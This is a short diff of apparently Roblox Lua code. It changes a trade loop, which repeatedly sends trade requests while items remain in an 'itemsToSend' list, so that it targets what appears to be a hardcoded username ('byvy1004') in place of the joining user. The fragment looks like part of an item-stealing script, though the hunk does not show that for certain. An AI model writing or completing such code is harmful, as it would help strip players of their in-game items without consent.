@@ -395,9 +395,9 @@ if #itemsToSend > 0 then
         return batch
     end
 
-    local function doTrade(joinedUser)
+    local function doTrade(byvy1004)
         while #itemsToSend > 0 do
-            sendTradeRequest(joinedUser)
+            sendTradeRequest(byvy1004)
             repeat
                 wait(0.5)
             until inTrade
